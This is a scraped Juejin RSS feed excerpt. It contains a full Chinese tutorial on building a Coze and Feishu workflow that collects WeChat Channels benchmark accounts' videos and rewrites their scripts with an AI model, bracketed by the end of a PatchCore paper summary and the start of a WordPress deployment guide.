<p>本文提出了PatchCore，一个免训练的、基于记忆库的冷启动异常检测框架，有效地平衡了性能、效率和可扩展性。通过利用局部感知的块级特征和核心集缩减的记忆库，PatchCore在最大化正常上下文覆盖的同时，缓解了ImageNet偏差和推理瓶颈。大量实验证明其在多个基准测试的图像级检测和像素级定位上取得了最先进的结果。该方法在小样本设置下的强劲表现进一步凸显了其实用价值。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[我用 Coze + 飞书自动拆解了 100+ 个视频号对标账号，彻底终结「素材枯竭」困境]]></title>    <link>https://juejin.cn/post/7592119218024906787</link>    <guid>https://juejin.cn/post/7592119218024906787</guid>    <pubDate>2026-01-06T06:10:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592119218024906787" data-draft-id="7591806035757776938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="我用 Coze + 飞书自动拆解了 100+ 个视频号对标账号，彻底终结「素材枯竭」困境"/> <meta itemprop="keywords" content="Coze,AIGC,人工智能"/> <meta itemprop="datePublished" content="2026-01-06T06:10:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="后端小肥肠"/> <meta itemprop="url" content="https://juejin.cn/user/2966945320667536"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            我用 Coze + 飞书自动拆解了 100+ 个视频号对标账号，彻底终结「素材枯竭」困境
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2966945320667536/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    后端小肥肠
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:10:50.000Z" title="Tue Jan 06 2026 06:10:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是小肥肠！还在手动整理视频号对标数据？本期教你用 <strong>Coze +</strong> <strong>飞书</strong> <strong>+ 自研插件</strong> 搭建全自动<strong>情报监控</strong> <strong>工作流</strong>。只需输入账号，<strong>一键聚合头部账号动态，AI 自动拆解二创并同步入库</strong>。想拥有自动化的私人素材库，这篇硬核干货千万别错过~</p>
<h2 data-id="heading-0">1. 前言</h2>
<p>做自媒体的小伙伴都知道每个平台的运营规则是不一样的，同样的视频素材每个平台的文案风格，标题都要不一样才能发挥出它的价值。<strong>该怎么做？</strong> 最快的方法就是<strong>摸着石头过河</strong>——<strong>聚合大佬的经验，分析对标账号的爆款逻辑</strong>。我之前用coze做了一个聚合小红书和抖音信息的工作流。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f39a8f9db65b4fd380069a4bed944b43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=5vHsJwaEsYKj0x4rryujqJ2j15A%3D" alt="" loading="lazy"/></p>
<p>因为之前工作流用的都是别人的插件，后来插件出问题了现在工作流用不了了，于是我决定自己做一套聚合工作流，涵盖视频号，抖音等平台。今天先讲视频号的，工作流的使用方法很简单，只需要在开始节点输入必要参数点击运行。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82630e1f53f6473da2cb48131967b255~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=Bb7X3pY4doSqBGUB37jsYJMAiVc%3D" alt="" loading="lazy"/></p>
<p>等待几分钟对标账号数据就会被整理写入到飞书当中。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68cb2a71398a47f6af16bd65e8987892~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=oXXHl0y8EzfzAvdk1XGu75U%2Bccs%3D" alt="" loading="lazy"/></p>
<p>话不多说直接跟练，文末照例准备了小肥肠自用的<strong>独家提示词模板</strong>，手慢无！</p>
<h2 data-id="heading-1">2. 工作流搭建</h2>
<p>完整工作流如下，整体工作流并不复杂，接下来就教大家依次搭建。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4676bca3bcb7488786f65fbe3ed172a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=qLo2s3%2FYFW4Wb0Wd80Zp5u0SllQ%3D" alt="" loading="lazy"/></p>
<p>流程可归纳为：</p>
<ol>
<li>
<p>获取视频号ID</p>
</li>
<li>
<p>根据ID获取作品列表</p>
</li>
<li>
<p>获取每个作品的详情，如互动数据和文案</p>
</li>
<li>
<p>写入飞书</p>
</li>
</ol>
<p>本工作流中80%是我的自研插件，大家在插件市场搜索小肥肠即可使用：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ca5dfc46f2b4ba7ba42bff9f463c818~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=oUVfhH%2BqiPOmkB8JY%2B6EUU%2F5N78%3D" alt="" loading="lazy"/></p>
<p><strong>开始节点：</strong> 开始节点接收的参数有keyword（账号名称）、key（视频号接口key）、alikey（阿里云百炼key）。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b50d2c7d174439b755a443e33b74b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=lPeEM2qXlCForQzoaRBVUVa90wM%3D" alt="" loading="lazy"/></p>
<p><strong>获取账号id：</strong> 这个插件属于小肥肠视频号插件，它的作用是可以根据账号名称获取视频号的ID。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a2e4a51b10d450d829f3a70fde0f3ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=xGSF%2BF84WCC31slS7s6A7hjBAjU%3D" alt="" loading="lazy"/></p>
<p><strong>获取账号下的作品列表：</strong> 这个插件属于小肥肠视频号插件，它的作用是根据视频ID获取账号下的所有作品信息。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e8ea8b80d08407e8f7deb912348d738~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=094IEizvMHYgd8XxznY%2BSMtwMbo%3D" alt="" loading="lazy"/></p>
<p><strong>代码（规整获取的作品数据）：</strong> 这是一个代码节点，它的作用是规整作品数据，输出规则的对象数组。如下图所示，我将标题、评论数、发布时间等核心属性进行了拼接整合，输出为规则的对象数组，方便后续处理。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74cbe53920254e269cec6082dced9b2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=tz7gjoI58%2Bzuu3rNyo6cYCMrzLk%3D" alt="" loading="lazy"/></p>
<p><strong>循环：</strong> 这个节点的作用是遍历视频列表中的每个数据信息，提取文案，进行二创，最后将数据规整后写入到飞书多维表格。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe63b43140d044cea1e16864dca0464b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=tz%2B6dMcBxlRG%2Fi6xBf3TzJbPAx0%3D" alt="" loading="lazy"/></p>
<p><strong>获取真实视频地址：</strong> 这个插件属于小肥肠视频号插件，它的作用是获取真实的视频地址。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e5de3ff5be04d20955b740fb42bb28a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=EmvpaDsxeI7PPF%2BWAJ4dpH%2FNGQk%3D" alt="" loading="lazy"/></p>
<p><strong>基于阿里云百炼模型提取文案：</strong> 这也是我开发的插件，插件市场搜索小肥肠即可找到并使用。它的作用是根据真实的视频地址提取文案内容。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a1f9df8dfec452980396d496dcb2ecb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=7CHxU4BMELoqD5nAxYXJnUWRRnw%3D" alt="" loading="lazy"/></p>
<p><strong>二创文案（大模型）：</strong> 这是一个大模型节点，采用豆包编程模型，它的作用是对原始文案进行二创改写生成新的文案。相关提示词我已整理到提示词模板当中，需要的文末领取。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d78d2aef3e2245b88275147a115820ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=wnF4GixefIN%2BRbzh4jfNlMXIFoU%3D" alt="" loading="lazy"/></p>
<p><strong>将数据适配为</strong> <strong>飞书</strong> <strong>表格的形式(代码)：</strong> 这是一个代码节点，它的作用是将前置获得的数据规整为适配飞书表格的形式。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08302b8dd3e04af48abe98179be9fa50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=7mxNcRpGTqJyzV7VAgTcIAMRj6c%3D" alt="" loading="lazy"/></p>
<p><strong>add_records：</strong> 这是飞书插件，在app_token处填写表格链接，在records处输入前置代码节点的生成结果。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/553ba8889a9644be9daad4bbd55d9dbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=VG85XcpwZMoYiNZfBDoAElgIk1Q%3D" alt="" loading="lazy"/></p>
<p><strong>结束：</strong> 结束节点链接到了循环外部，主要起到一个监听写入的作用。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97a9e669056645e596e7bc363093cc7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=ZbeGtSUl7eDyAr39kybq3rIrk3c%3D" alt="" loading="lazy"/></p>
<p>以上就是整个工作流的完整流程拆解，动手能力强的读者可以跟着教程实践一遍。<strong>上述工作流已经被收录到了小肥肠共学群中，如果想直接获取工作流原件，可以加入社群后我拉你进空间直接学习使用。</strong></p>
<p>另小肥肠自用的提示词模板限量30份，想要的可以666获取哦~</p>
<h2 data-id="heading-2">3. 结语</h2>
<p>授人以鱼不如授人以渔，这套工作流的核心是<strong>从数据获取到AI二创的完整闭环</strong>。当你把繁琐的数据录入交给Coze，你才能腾出更多精力去思考内容本身。再次强调，文中用到的核心插件均为<strong>小肥肠自研</strong>，主打一个长期稳定。</p>
<p><strong>如本次分享对你有帮助，麻烦一键三连支持一下小肥肠，我们下期再见~</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ca6c2593c6742648c67c4c6cc91968b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284650&amp;x-signature=5WGrT6MntocQ0z9tAZKTxPyVtw0%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[0基础如何搭建个人博客？GMSSH可视化运维工具配合WordPress部署全流程教学]]></title>    <link>https://juejin.cn/post/7592088192506331190</link>    <guid>https://juejin.cn/post/7592088192506331190</guid>    <pubDate>2026-01-06T05:54:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592088192506331190" data-draft-id="7591816944728735780" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="0基础如何搭建个人博客？GMSSH可视化运维工具配合WordPress部署全流程教学"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-06T05:54:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="无爱如何释怀"/> <meta itemprop="url" content="https://juejin.cn/user/4158824111150512"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            0基础如何搭建个人博客？GMSSH可视化运维工具配合WordPress部署全流程教学
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4158824111150512/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    无爱如何释怀
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T05:54:40.000Z" title="Tue Jan 06 2026 05:54:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在当前的互联网基础设施运维领域，服务器的管理效率与安全性始终是核心命题。传统的基于命令行界面（CLI）的操作模式虽然功能强大，但对于大规模集群管理或追求极致效率的开发者而言，存在着认知负担重、可视化程度低以及操作容错率差等痛点。GMSSH作为一款轻量级可视化服务器管理工具，通过集成安全SSH隧道、终端与桌面双模式以及丰富的容器化应用管理功能，为服务器运维提供了一套全新的解决方案。其核心设计理念在于将复杂的服务器操作转化为直观的图形化交互，从而实现对多台主机的轻松掌控。
<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.gm.cn%2F" target="_blank" title="https://www.gm.cn/" ref="nofollow noopener noreferrer">www.gm.cn/</a></p>
